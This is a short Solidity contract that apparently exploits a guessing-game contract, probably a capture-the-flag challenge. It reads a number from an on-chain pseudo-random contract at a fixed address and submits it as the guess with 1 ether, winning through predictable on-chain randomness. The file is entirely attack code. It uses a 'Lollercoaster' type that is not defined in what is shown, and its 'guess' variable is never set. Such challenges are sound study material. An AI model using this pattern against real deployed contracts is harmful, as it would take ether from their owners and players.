pragma solidity 0.8.4;

import "./iflp.sol";
import "hardhat/console.sol";


contract iflpexp {
    
    iflp public exploit;
    address public target;
    uint256 guess;
    address lollercoaster =  0x25Be61724B64117DC9aC9DDd2A06B7DEc052D5cb;
    

    constructor(address _instance) payable {
        exploit = iflp(_instance);
        target = _instance;   
    }
    function solve1() public payable returns (uint)
    {
        require (msg.value == 1 ether);
        Lollercoaster rng = Lollercoaster(lollercoaster);
        exploit.guess{value: 1 ether}(rng.randInt(1000000));
        
        return (guess);
        
    }   

    receive() external payable
    {

    }
}

